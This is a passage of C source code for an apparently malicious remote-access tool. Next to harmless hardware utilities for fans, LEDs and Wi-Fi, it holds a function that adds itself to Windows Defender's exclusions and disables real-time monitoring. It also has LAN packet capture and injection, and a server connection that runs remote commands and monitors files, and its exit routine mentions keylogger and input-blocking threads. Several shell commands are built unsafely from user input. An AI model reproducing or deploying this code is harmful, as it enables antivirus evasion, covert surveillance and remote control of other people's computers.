    printf("Brightness set to %d%%\n", brightness);
#endif
}

// Ring Command
void ring_command(char **args) {
    printf("\n[Ring Command]\n");
    
    if (args[0] == NULL) {
        printf("Usage: ring <path/to/audio/file>\n");
        return;
    }
    
    // Check if file exists
    FILE *fp = fopen(args[0], "rb");
    if (!fp) {
        printf("Error: File not found: %s\n", args[0]);
        return;
    }
    fclose(fp);
    
#ifdef _WIN32
    // Windows implementation using mciSendString
    char cmd[MAX_COMMAND_LENGTH * 2];
    snprintf(cmd, sizeof(cmd), "open \"%s\" type mpegvideo alias mp3", args[0]);
    mciSendString(cmd, NULL, 0, NULL);
    
    mciSendString("play mp3", NULL, 0, NULL);
    
    printf("Playing audio file: %s\n", args[0]);
    
    // Wait for playback to finish (simplified)
    Sleep(5000); // Wait 5 seconds, adjust as needed
    
    mciSendString("close mp3", NULL, 0, NULL);
#else
    // Linux implementation
    char cmd[MAX_COMMAND_LENGTH * 2];
    
    // Try with aplay (ALSA)
    snprintf(cmd, sizeof(cmd), "aplay \"%s\"", args[0]);
    int result = system(cmd);
    
    if (result != 0) {
        // Try with paplay (PulseAudio)
        snprintf(cmd, sizeof(cmd), "paplay \"%s\"", args[0]);
        result = system(cmd);
        
        if (result != 0) {
            printf("Failed to play audio file. Neither aplay nor paplay available.\n");
            return;
        }
    }
    
    printf("Playing audio file: %s\n", args[0]);
#endif
}

// WLAN Control
void wlan_control(char **args) {
    printf("\n[Wireless Network Control]\n");
    
    if (args[0] == NULL) {
        printf("Usage: wlan <scan|connect|disconnect|info> [parameters]\n");
        return;
    }
    
#ifdef _WIN32
    HANDLE hClient = NULL;
    DWORD dwVersion = 0;
    DWORD dwResult = 0;
    
    dwResult = WlanOpenHandle(2, NULL, &dwVersion, &hClient);
    if (dwResult != ERROR_SUCCESS) {
        printf("Failed to open WLAN handle\n");
        return;
    }
    
    if (strcmp(args[0], "scan") == 0) {
        PWLAN_BSS_LIST pBssList = NULL;
        PWLAN_RAW_DATA pIeData = NULL;
        
        dwResult = WlanScan(hClient, NULL, NULL, NULL, NULL);
        if (dwResult != ERROR_SUCCESS) {
            printf("Failed to scan for networks\n");
            WlanCloseHandle(hClient, NULL);
            return;
        }
        
        PWLAN_AVAILABLE_NETWORK_LIST pNetworkList = NULL;
        dwResult = WlanGetAvailableNetworkList(hClient, NULL, 0, NULL, &pNetworkList);
        if (dwResult != ERROR_SUCCESS) {
            printf("Failed to get network list\n");
            WlanCloseHandle(hClient, NULL);
            return;
        }
        
        printf("Available WiFi Networks:\n");
        for (DWORD i = 0; i < pNetworkList->dwNumberOfItems; i++) {
            printf("%-30s Signal: %3d%%\n", 
                   pNetworkList->Network[i].strProfileName, 
                   (int)pNetworkList->Network[i].wlanSignalQuality);
        }
        
        if (pNetworkList) {
            WlanFreeMemory(pNetworkList);
        }
    }
    else if (strcmp(args[0], "connect") == 0) {
        if (args[1] == NULL) {
            printf("Usage: wlan connect <ssid> [password]\n");
            WlanCloseHandle(hClient, NULL);
            return;
        }
        
        size_t len = strlen(args[1]) + 1;
        wchar_t *ssid = (wchar_t*)malloc(len * sizeof(wchar_t));
        mbstowcs(ssid, args[1], len);
        
        WLAN_CONNECTION_PARAMETERS wlanConnParam;
        memset(&wlanConnParam, 0, sizeof(WLAN_CONNECTION_PARAMETERS));
        
        wlanConnParam.wlanConnectionMode = wlan_connection_mode_profile;
        wlanConnParam.strProfile = ssid;
        wlanConnParam.dwFlags = 0;
        
        if (args[2]) {
            wchar_t profileXml[1024];
            char profileXmlA[1024];
            snprintf(profileXmlA, sizeof(profileXmlA), 
                    "<?xml version=\"1.0\"?>"
                    "<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">"
                    "<name>%s</name>"
                    "<SSIDConfig>"
                    "<SSID>"
                    "<name>%s</name>"
                    "</SSID>"
                    "</SSIDConfig>"
                    "<connectionType>ESS</connectionType>"
                    "<connectionMode>auto</connectionMode>"
                    "<MSM>"
                    "<security>"
                    "<authEncryption>"
                    "<authentication>WPA2PSK</authentication>"
                    "<encryption>AES</encryption>"
                    "<useOneX>false</useOneX>"
                    "</authEncryption>"
                    "<sharedKey>"
                    "<keyType>passPhrase</keyType>"
                    "<protected>false</protected>"
                    "<keyMaterial>%s</keyMaterial>"
                    "</sharedKey>"
                    "</security>"
                    "</MSM>"
                    "</WLANProfile>", 
                    args[1], args[1], args[2]);
            
            mbstowcs(profileXml, profileXmlA, sizeof(profileXml));
            
            dwResult = WlanSetProfile(hClient, NULL, 0, profileXml, NULL, TRUE, NULL, NULL);
            if (dwResult != ERROR_SUCCESS) {
                printf("Failed to set profile\n");
                free(ssid);
                WlanCloseHandle(hClient, NULL);
                return;
            }
        }
        
        dwResult = WlanConnect(hClient, NULL, &wlanConnParam, NULL);
        if (dwResult == ERROR_SUCCESS) {
            printf("Connecting to %S...\n", ssid);
        } else {
            printf("Failed to connect to network\n");
        }
        
        free(ssid);
    }
    else if (strcmp(args[0], "disconnect") == 0) {
        dwResult = WlanDisconnect(hClient, NULL, NULL);
        if (dwResult == ERROR_SUCCESS) {
            printf("Disconnected from current network\n");
        } else {
            printf("Failed to disconnect\n");
        }
    }
    else if (strcmp(args[0], "info") == 0) {
        PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
        dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
        
        if (dwResult == ERROR_SUCCESS && pIfList->dwNumberOfItems > 0) {
            PWLAN_INTERFACE_INFO pIfInfo = &pIfList->InterfaceInfo[0];
            
            PWLAN_CONNECTION_ATTRIBUTES pConnAttributes = NULL;
            DWORD dwConnAttributesSize = sizeof(WLAN_CONNECTION_ATTRIBUTES);
            
            dwResult = WlanQueryInterface(hClient, &pIfInfo->InterfaceGuid, 
                                         wlan_intf_opcode_current_connection, 
                                         NULL, &dwConnAttributesSize, 
                                         (PVOID*)&pConnAttributes, NULL);
            
            if (dwResult == ERROR_SUCCESS) {
                printf("Current Connection:\n");
                printf("SSID: %S\n", pConnAttributes->wlanAssociationAttributes.dot11Ssid.ucSSID);
                printf("State: %d\n", pConnAttributes->isState);
                
                if (pConnAttributes) {
                    WlanFreeMemory(pConnAttributes);
                }
            }
        }
        
        if (pIfList) {
            WlanFreeMemory(pIfList);
        }
    }
    else {
        printf("Unknown command: %s\n", args[0]);
    }
    
    WlanCloseHandle(hClient, NULL);
#else
    char cmd[MAX_COMMAND_LENGTH];
    
    if (strcmp(args[0], "scan") == 0) {
        printf("Scanning for wireless networks...\n");
        snprintf(cmd, sizeof(cmd), "iwlist scan | grep ESSID");
        system(cmd);
    }
    else if (strcmp(args[0], "connect") == 0) {
        if (args[1] == NULL) {
            printf("Usage: wlan connect <ssid> [password]\n");
            return;
        }
        
        if (args[2]) {
            snprintf(cmd, sizeof(cmd), "nmcli dev wifi connect '%s' password '%s'", args[1], args[2]);
        } else {
            snprintf(cmd, sizeof(cmd), "nmcli dev wifi connect '%s'", args[1]);
        }
        
        system(cmd);
    }
    else if (strcmp(args[0], "disconnect") == 0) {
        snprintf(cmd, sizeof(cmd), "nmcli dev disconnect");
        system(cmd);
    }
    else if (strcmp(args[0], "info") == 0) {
        snprintf(cmd, sizeof(cmd), "iwconfig");
        system(cmd);
    }
    else {
        printf("Unknown command: %s\n", args[0]);
    }
#endif
}

// Fan Control
void fan_control(char **args) {
    printf("\n[Fan Control]\n");
    
    if (args[0] == NULL) {
        printf("Usage: fanctl <on|off|speed> [value]\n");
        return;
    }
    
#ifdef _WIN32
    if (strcmp(args[0], "on") == 0) {
        printf("Turning fans on\n");
        printf("Windows fan control requires vendor-specific APIs\n");
    }
    else if (strcmp(args[0], "off") == 0) {
        printf("Turning fans off\n");
        printf("Windows fan control requires vendor-specific APIs\n");
    }
    else if (strcmp(args[0], "speed") == 0) {
        if (args[1] == NULL) {
            printf("Usage: fanctl speed <value (0-100)>\n");
            return;
        }
        
        int speed = atoi(args[1]);
        if (speed < 0) speed = 0;
        if (speed > 100) speed = 100;
        
        printf("Setting fan speed to %d%%\n", speed);
        printf("Windows fan control requires vendor-specific APIs\n");
    }
#else
    char cmd[MAX_COMMAND_LENGTH];
    
    if (strcmp(args[0], "on") == 0) {
        printf("Turning fans on\n");
        snprintf(cmd, sizeof(cmd), "echo 1 > /sys/class/hwmon/hwmon*/pwm*_enable");
        system(cmd);
    }
    else if (strcmp(args[0], "off") == 0) {
        printf("Turning fans off\n");
        snprintf(cmd, sizeof(cmd), "echo 0 > /sys/class/hwmon/hwmon*/pwm*_enable");
        system(cmd);
    }
    else if (strcmp(args[0], "speed") == 0) {
        if (args[1] == NULL) {
            printf("Usage: fanctl speed <value (0-255)>\n");
            return;
        }
        
        int speed = atoi(args[1]);
        if (speed < 0) speed = 0;
        if (speed > 255) speed = 255;
        
        printf("Setting fan speed to %d\n", speed);
        snprintf(cmd, sizeof(cmd), "echo %d > /sys/class/hwmon/hwmon*/pwm*", speed);
        system(cmd);
    }
#endif
}

// LAN Interception
void lan_intercept(char **args) {
    printf("\n[LAN Traffic Interception]\n");
    
    if (args[0] == NULL) {
        printf("Usage: lanintercept <start|stop|inject> [parameters]\n");
        return;
    }
    
    if (strcmp(args[0], "start") == 0) {
        printf("Starting LAN traffic interception...\n");
        
#ifdef _WIN32
        printf("Windows LAN interception requires WinPcap or Npcap\n");
        printf("Consider using: npcap - https://nmap.org/npcap/\n");
#else
        printf("Starting packet capture on all interfaces...\n");
        char cmd[MAX_COMMAND_LENGTH];
        snprintf(cmd, sizeof(cmd), "sudo tcpdump -i any -w %s/captures/lan_capture.pcap", output_dir);
        system(cmd);
#endif
    }
    else if (strcmp(args[0], "stop") == 0) {
        printf("Stopping LAN traffic interception...\n");
        
#ifdef _WIN32
        printf("Stopping packet capture...\n");
#else
        system("pkill -f tcpdump");
#endif
    }
    else if (strcmp(args[0], "inject") == 0) {
        if (args[1] == NULL || args[2] == NULL) {
            printf("Usage: lanintercept inject <interface> <packet_data>\n");
            return;
        }
        
        printf("Injecting packet on interface %s...\n", args[1]);
        
#ifdef _WIN32
        printf("Windows packet injection requires WinPcap or Npcap\n");
#else
        char cmd[MAX_COMMAND_LENGTH];
        snprintf(cmd, sizeof(cmd), "sudo sendip -p ipv4 -p tcp -d %s %s", args[2], args[1]);
        system(cmd);
#endif
    }
    else {
        printf("Unknown command: %s\n", args[0]);
    }
}

// Unhook Defender
void unhook_defender(char **args) {
    printf("\n[Windows Defender Unhook]\n");
    
#ifdef _WIN32
    BOOL isAdmin = FALSE;
    HANDLE token = NULL;
    
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD size = sizeof(TOKEN_ELEVATION);
        
        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
            isAdmin = elevation.TokenIsElevated;
        }
        
        CloseHandle(token);
    }
    
    if (!isAdmin) {
        printf("Error: This command requires administrator privileges\n");
        return;
    }
    
    char path[MAX_PATH_LENGTH];
    GetModuleFileName(NULL, path, MAX_PATH_LENGTH);
    
    char cmd[MAX_COMMAND_LENGTH];
    snprintf(cmd, sizeof(cmd), "powershell -Command \"Add-MpPreference -ExclusionPath '%s'\"", path);
    system(cmd);
    
    snprintf(cmd, sizeof(cmd), "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");
    system(cmd);
    
    printf("Windows Defender unhooked and exception added for this process\n");
    printf("Real-time monitoring temporarily disabled\n");
#else
    printf("This command is only available on Windows\n");
#endif
}

// Hardware Information
void hardware_info(char **args) {
    printf("\n[Detailed Hardware Information]\n");
    char output[4096];
    
#ifdef _WIN32
    printf("\nCPU Details:\n");
    execute_command("wmic cpu get name,manufacturer,maxclockspeed,numberofcores,numberoflogicalprocessors,processortype", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nMemory Details:\n");
    execute_command("wmic memorychip get banklabel,capacity,manufacturer,partnumber,speed,serialnumber", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nDisk Details:\n");
    execute_command("wmic diskdrive get model,firmwarerevision,serialnumber,size,interfacetype", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nGPU Details:\n");
    execute_command("wmic path win32_VideoController get name,adapterram,driverversion", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nMotherboard Details:\n");
    execute_command("wmic baseboard get manufacturer,product,serialnumber", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nBIOS Details:\n");
    execute_command("wmic bios get manufacturer,serialnumber,version,releaseDate", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nNetwork Adapters:\n");
    execute_command("wmic nic get name,macaddress,netconnectionid,netenabled", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nUSB Devices:\n");
    execute_command("wmic path win32_usbcontrollerdevice get dependent", output, sizeof(output));
    printf("%s\n", output);
#else
    printf("\nCPU Details:\n");
    execute_command("cat /proc/cpuinfo | grep -E 'model name|processor|cpu MHz|cache size'", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nMemory Details:\n");
    execute_command("sudo dmidecode --type memory | grep -E 'Size|Type|Speed|Manufacturer|Serial Number'", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nDisk Details:\n");
    execute_command("sudo hdparm -I /dev/sda | grep -E 'Model Number|Serial Number|Firmware Revision'", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nGPU Details:\n");
    execute_command("lspci -vnn | grep -i VGA -A 12", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nMotherboard Details:\n");
    execute_command("sudo dmidecode --type baseboard | grep -E 'Manufacturer|Product Name|Serial Number'", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nBIOS Details:\n");
    execute_command("sudo dmidecode --type bios | grep -E 'Vendor|Version|Release Date'", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nNetwork Adapters:\n");
    execute_command("lspci -vnn | grep -i ethernet -A 8", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nUSB Devices:\n");
    execute_command("lsusb -v", output, sizeof(output));
    printf("%s\n", output);
#endif
}

// LED Control
void led_control(char **args) {
    printf("\n[LED Control]\n");
    
    if (args[0] == NULL) {
        printf("Usage: ledctl <on|off|blink|color> [parameters]\n");
        return;
    }
    
#ifdef _WIN32
    if (strcmp(args[0], "on") == 0) {
        printf("Turning LEDs on\n");
        printf("Windows LED control requires vendor-specific APIs\n");
    }
    else if (strcmp(args[0], "off") == 0) {
        printf("Turning LEDs off\n");
        printf("Windows LED control requires vendor-specific APIs\n");
    }
    else if (strcmp(args[0], "blink") == 0) {
        printf("Blinking LEDs\n");
        printf("Windows LED control requires vendor-specific APIs\n");
    }
    else if (strcmp(args[0], "color") == 0) {
        if (args[1] == NULL) {
            printf("Usage: ledctl color <RRGGBB>\n");
            return;
        }
        
        printf("Setting LED color to %s\n", args[1]);
        printf("Windows LED control requires vendor-specific APIs\n");
    }
#else
    char cmd[MAX_COMMAND_LENGTH];
    
    if (strcmp(args[0], "on") == 0) {
        printf("Turning LEDs on\n");
        snprintf(cmd, sizeof(cmd), "echo 1 > /sys/class/leds/*/brightness");
        system(cmd);
    }
    else if (strcmp(args[0], "off") == 0) {
        printf("Turning LEDs off\n");
        snprintf(cmd, sizeof(cmd), "echo 0 > /sys/class/leds/*/brightness");
        system(cmd);
    }
    else if (strcmp(args[0], "blink") == 0) {
        printf("Blinking LEDs\n");
        snprintf(cmd, sizeof(cmd), "echo timer > /sys/class/leds/*/trigger");
        system(cmd);
    }
    else if (strcmp(args[0], "color") == 0) {
        if (args[1] == NULL) {
            printf("Usage: ledctl color <RRGGBB>\n");
            return;
        }
        
        printf("Setting LED color to %s\n", args[1]);
        printf("RGB LED control requires specific hardware interfaces\n");
    }
#endif
}

// Beeper Control
void beeper_control(char **args) {
    printf("\n[System Beeper Control]\n");
    
    if (args[0] == NULL) {
        printf("Usage: beeper <on|off|beep> [frequency] [duration]\n");
        return;
    }
    
#ifdef _WIN32
    if (strcmp(args[0], "on") == 0) {
        printf("Enabling system beeper\n");
        printf("Windows beeper control requires specific APIs\n");
    }
    else if (strcmp(args[0], "off") == 0) {
        printf("Disabling system beeper\n");
        printf("Windows beeper control requires specific APIs\n");
    }
    else if (strcmp(args[0], "beep") == 0) {
        int frequency = 1000;
        int duration = 500;
        
        if (args[1]) frequency = atoi(args[1]);
        if (args[2]) duration = atoi(args[2]);
        
        printf("Beeping at %dHz for %dms\n", frequency, duration);
        Beep(frequency, duration);
    }
#else
    char cmd[MAX_COMMAND_LENGTH];
    
    if (strcmp(args[0], "on") == 0) {
        printf("Enabling system beeper\n");
        snprintf(cmd, sizeof(cmd), "sudo modprobe pcspkr");
        system(cmd);
    }
    else if (strcmp(args[0], "off") == 0) {
        printf("Disabling system beeper\n");
        snprintf(cmd, sizeof(cmd), "sudo rmmod pcspkr");
        system(cmd);
    }
    else if (strcmp(args[0], "beep") == 0) {
        int frequency = 1000;
        int duration = 500;
        
        if (args[1]) frequency = atoi(args[1]);
        if (args[2]) duration = atoi(args[2]);
        
        printf("Beeping at %dHz for %dms\n", frequency, duration);
        snprintf(cmd, sizeof(cmd), "beep -f %d -l %d", frequency, duration);
        system(cmd);
    }
#endif
}

// USB Dump
void usb_dump(char **args) {
    printf("\n[USB Traffic Monitoring]\n");
    
    if (args[0] == NULL) {
        printf("Usage: usbdump <start|stop>\n");
        return;
    }
    
    if (strcmp(args[0], "start") == 0) {
        printf("Starting USB traffic monitoring...\n");
        
#ifdef _WIN32
        printf("Windows USB monitoring requires USBPcap or Wireshark with USB support\n");
        printf("Consider using: USBPcap - https://desowin.org/usbpcap/\n");
#else
        char cmd[MAX_COMMAND_LENGTH];
        snprintf(cmd, sizeof(cmd), "sudo usbmon -t -w %s/captures/usb_capture.pcap", output_dir);
        system(cmd);
#endif
    }
    else if (strcmp(args[0], "stop") == 0) {
        printf("Stopping USB traffic monitoring...\n");
        
#ifdef _WIN32
        printf("Stopping USB capture...\n");
#else
        system("pkill -f usbmon");
#endif
    }
    else {
        printf("Unknown command: %s\n", args[0]);
    }
}

// Raw Socket
void raw_socket(char **args) {
    printf("\n[Raw Socket Operations]\n");
    
    if (args[0] == NULL) {
        printf("Usage: rawsock <send|listen> [parameters]\n");
        return;
    }
    
    if (strcmp(args[0], "send") == 0) {
        if (args[1] == NULL || args[2] == NULL) {
            printf("Usage: rawsock send <interface> <packet_data>\n");
            return;
        }
        
        printf("Sending raw packet on interface %s...\n", args[1]);
        
#ifdef _WIN32
        printf("Windows raw socket operations require WinPcap or Npcap\n");
#else
        char cmd[MAX_COMMAND_LENGTH];
        snprintf(cmd, sizeof(cmd), "sudo sendip -p ipv4 -p tcp -d %s -i %s", args[2], args[1]);
        system(cmd);
#endif
    }
    else if (strcmp(args[0], "listen") == 0) {
        if (args[1] == NULL) {
            printf("Usage: rawsock listen <interface>\n");
            return;
        }
        
        printf("Listening for raw packets on interface %s...\n", args[1]);
        
#ifdef _WIN32
        printf("Windows raw socket listening requires WinPcap or Npcap\n");
#else
        char cmd[MAX_COMMAND_LENGTH];
        snprintf(cmd, sizeof(cmd), "sudo tcpdump -i %s -w %s/captures/raw_capture.pcap", args[1], output_dir);
        system(cmd);
#endif
    }
    else {
        printf("Unknown command: %s\n", args[0]);
    }
}

// Power Control
void power_control(char **args) {
    printf("\n[Power Management Control]\n");
    
    if (args[0] == NULL) {
        printf("Usage: power <sleep|hibernate|shutdown|reboot>\n");
        return;
    }
    
#ifdef _WIN32
    if (strcmp(args[0], "sleep") == 0) {
        printf("Putting system to sleep...\n");
        SetSuspendState(FALSE, FALSE, FALSE);
    }
    else if (strcmp(args[0], "hibernate") == 0) {
        printf("Hibernating system...\n");
        SetSuspendState(TRUE, FALSE, FALSE);
    }
    else if (strcmp(args[0], "shutdown") == 0) {
        printf("Shutting down system...\n");
        system("shutdown /s /t 0");
    }
    else if (strcmp(args[0], "reboot") == 0) {
        printf("Rebooting system...\n");
        system("shutdown /r /t 0");
    }
#else
    char cmd[MAX_COMMAND_LENGTH];
    
    if (strcmp(args[0], "sleep") == 0) {
        printf("Putting system to sleep...\n");
        snprintf(cmd, sizeof(cmd), "systemctl suspend");
        system(cmd);
    }
    else if (strcmp(args[0], "hibernate") == 0) {
        printf("Hibernating system...\n");
        snprintf(cmd, sizeof(cmd), "systemctl hibernate");
        system(cmd);
    }
    else if (strcmp(args[0], "shutdown") == 0) {
        printf("Shutting down system...\n");
        snprintf(cmd, sizeof(cmd), "shutdown -h now");
        system(cmd);
    }
    else if (strcmp(args[0], "reboot") == 0) {
        printf("Rebooting system...\n");
        snprintf(cmd, sizeof(cmd), "reboot");
        system(cmd);
    }
#endif
}

// Thermal Control
void thermal_control(char **args) {
    printf("\n[Thermal Management Control]\n");
    
    if (args[0] == NULL) {
        printf("Usage: thermal <info|throttle|cool>\n");
        return;
    }
    
    if (strcmp(args[0], "info") == 0) {
        printf("Retrieving thermal information...\n");
        
#ifdef _WIN32
        char output[4096];
        execute_command("wmic /namespace:\\\\root\\wmi PATH MSAcpi_ThermalZoneTemperature get CurrentTemperature", output, sizeof(output));
        printf("Temperature: %s\n", output);
#else
        char cmd[MAX_COMMAND_LENGTH];
        snprintf(cmd, sizeof(cmd), "cat /sys/class/thermal/thermal_zone*/temp");
        system(cmd);
#endif
    }
    else if (strcmp(args[0], "throttle") == 0) {
        printf("Throttling CPU to reduce temperature...\n");
        
#ifdef _WIN32
        printf("Windows thermal throttling requires powercfg or vendor-specific tools\n");
#else
        char cmd[MAX_COMMAND_LENGTH];
        snprintf(cmd, sizeof(cmd), "echo -n 1 | sudo tee /sys/class/thermal/cooling_device*/cur_state");
        system(cmd);
#endif
    }
    else if (strcmp(args[0], "cool") == 0) {
        printf("Activating cooling mechanisms...\n");
        
#ifdef _WIN32
        printf("Windows cooling control requires vendor-specific tools\n");
#else
        char cmd[MAX_COMMAND_LENGTH];
        snprintf(cmd, sizeof(cmd), "echo -n 0 | sudo tee /sys/class/thermal/cooling_device*/cur_state");
        system(cmd);
#endif
    }
    else {
        printf("Unknown command: %s\n", args[0]);
    }
}

// Find Admin Processes
void find_admin_processes(char **args) {
    printf("\n[Admin Process Detection]\n");
    
#ifdef _WIN32
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        printf("Failed to create process snapshot\n");
        return;
    }
    
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        printf("Failed to get first process\n");
        return;
    }
    
    printf("Processes running as administrator:\n");
    
    do {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
        if (hProcess) {
            HANDLE hToken;
            if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
                TOKEN_ELEVATION elevation;
                DWORD size = sizeof(TOKEN_ELEVATION);
                if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
                    if (elevation.TokenIsElevated) {
                        printf("- %s (PID: %d)\n", pe32.szExeFile, pe32.th32ProcessID);
                    }
                }
                CloseHandle(hToken);
            }
            CloseHandle(hProcess);
        }
    } while (Process32Next(hProcessSnap, &pe32));
    
    CloseHandle(hProcessSnap);
#else
    printf("Processes running as root:\n");
    
    DIR *dir;
    struct dirent *entry;
    
    if ((dir = opendir("/proc")) == NULL) {
        printf("Failed to open /proc directory\n");
        return;
    }
    
    while ((entry = readdir(dir)) != NULL) {
        char *endptr;
        long pid = strtol(entry->d_name, &endptr, 10);
        if (*endptr != '\0') continue;
        
        char path[256];
        snprintf(path, sizeof(path), "/proc/%ld/status", pid);
        
        FILE *fp = fopen(path, "r");
        if (fp == NULL) continue;
        
        char line[256];
        int uid = 0;
        
        while (fgets(line, sizeof(line), fp)) {
            if (strncmp(line, "Uid:", 4) == 0) {
                sscanf(line + 4, "%d", &uid);
                break;
            }
        }
        
        fclose(fp);
        
        if (uid == 0) {
            snprintf(path, sizeof(path), "/proc/%ld/comm", pid);
            fp = fopen(path, "r");
            if (fp) {
                char name[256] = "";
                if (fgets(name, sizeof(name), fp)) {
                    name[strcspn(name, "\n")] = '\0';
                    printf("- %s (PID: %ld)\n", name, pid);
                }
                fclose(fp);
            }
        }
    }
    
    closedir(dir);
#endif
}

// Connect to server command
void connect_to_server(char **args) {
    if (connected_to_server) {
        printf("Already connected to server\n");
        return;
    }
    
    if (args[0] != NULL) {
        strncpy(server_ip, args[0], sizeof(server_ip) - 1);
    }
    
    if (connect_to_remote_server()) {
        // Start file monitoring when connected
        file_monitoring_active = 1;
        pthread_create(&file_monitor_thread, NULL, monitor_output_directory, NULL);
        
        // Start handling remote commands in a separate thread
        #ifdef _WIN32
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)handle_remote_commands, NULL, 0, NULL);
        #else
            pthread_t thread;
            pthread_create(&thread, NULL, (void *(*)(void *))handle_remote_commands, NULL);
            pthread_detach(thread);
        #endif
        
        printf("Connected to server at %s:%d\n", server_ip, SERVER_PORT);
    } else {
        printf("Failed to connect to server\n");
    }
}

// Disconnect from server command
void disconnect_from_server(char **args) {
    if (!connected_to_server) {
        printf("Not connected to server\n");
        return;
    }
    
    connected_to_server = 0;
    close(server_socket);
    server_socket = INVALID_FD;
    
    // Stop file monitoring
    file_monitoring_active = 0;
    pthread_join(file_monitor_thread, NULL);
    
    printf("Disconnected from server\n");
}

// Set server IP command
void set_server_ip(char **args) {
    if (args[0] == NULL) {
        printf("Usage: serverip <ip_address>\n");
        return;
    }
    
    strncpy(server_ip, args[0], sizeof(server_ip) - 1);
    printf("Server IP set to %s\n", server_ip);
}

// Startup programs
void startup_programs(char **args) {
    printf("\n[Startup Programs]\n");
    char output[4096];
    
#ifdef _WIN32
    printf("\nCurrent User Startup:\n");
    execute_command("dir \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nAll Users Startup:\n");
    execute_command("dir \"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nRegistry Startup:\n");
    execute_command("reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", output, sizeof(output));
    printf("%s\n", output);
    execute_command("reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nScheduled Tasks:\n");
    execute_command("schtasks /query /fo LIST", output, sizeof(output));
    printf("%s\n", output);
#else
    printf("\nCron jobs:\n");
    execute_command("crontab -l", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nSystemd services:\n");
    execute_command("systemctl list-unit-files --type=service | grep enabled", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nUser autostart entries:\n");
    execute_command("ls -la ~/.config/autostart", output, sizeof(output));
    printf("%s\n", output);
#endif
}

// Exit tool
void exit_tool(char **args) {
    printf("\nExiting...\n");
    realtime_monitoring = 0;
    keylogger_active = 0;
    input_blocked = 0;
    file_monitoring_active = 0;
    
    if (monitor_thread) {
        pthread_join(monitor_thread, NULL);
    }
    if (keylogger_thread) {
        pthread_join(keylogger_thread, NULL);
    }
    if (file_monitor_thread) {
        pthread_join(file_monitor_thread, NULL);
    }
    
    if (connected_to_server) {
        connected_to_server = 0;
        close(server_socket);
    }
    
    #ifdef _WIN32
        WSACleanup();
    #endif
    
    exit(0);
}

// Video streaming functions
static int send_all(socket_t fd, const void *buf, size_t len) {
    size_t total = 0;
    const char *p = (const char*)buf;
    while (total < len) {
        int sent = (int)send(fd, p + total, (int)(len - total), 0);
        if (sent <= 0) {
#ifdef _WIN32
            int err = WSAGetLastError();
            (void)err;
#else
            int err = errno;
            (void)err;
#endif
            return -1;
        }
        total += (size_t)sent;
    }
    return 0;
}

int init_video(void) {
#ifndef _WIN32
    struct v4l2_format fmt;
    struct v4l2_requestbuffers req;
    struct v4l2_buffer buf;

    video_fd = open(VIDEO_DEVICE, O_RDWR | O_NONBLOCK);
    if (video_fd < 0) {
        perror("open video device");
        return 0;
    }

    memset(&fmt, 0, sizeof(fmt));
    fmt.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    fmt.fmt.pix.width = WIDTH;
    fmt.fmt.pix.height = HEIGHT;
    fmt.fmt.pix.pixelformat = V4L2_PIX_FMT_MJPEG;
    fmt.fmt.pix.field = V4L2_FIELD_ANY;

    if (ioctl(video_fd, VIDIOC_S_FMT, &fmt) < 0) {
        perror("VIDIOC_S_FMT");
        close(video_fd);
        video_fd = -1;
        return 0;
    }

    memset(&req, 0, sizeof(req));
    req.count = 4;
    req.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    req.memory = V4L2_MEMORY_MMAP;

    if (ioctl(video_fd, VIDIOC_REQBUFS, &req) < 0) {
        perror("VIDIOC_REQBUFS");
        close(video_fd);
        video_fd = -1;
        return 0;
    }

    if (req.count < 2) {
        fprintf(stderr, "Insufficient buffer memory\n");
        close(video_fd);
        video_fd = -1;
        return 0;
    }

    buffers = calloc(req.count, sizeof(*buffers));
    if (!buffers) {
        perror("calloc buffers");
        close(video_fd);
        video_fd = -1;
        return 0;
    }

    for (n_buffers = 0; n_buffers < req.count; ++n_buffers) {
        memset(&buf, 0, sizeof(buf));
        buf.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
        buf.memory = V4L2_MEMORY_MMAP;
        buf.index = n_buffers;

        if (ioctl(video_fd, VIDIOC_QUERYBUF, &buf) < 0) {
            perror("VIDIOC_QUERYBUF");
            free(buffers);
            buffers = NULL;
            close(video_fd);
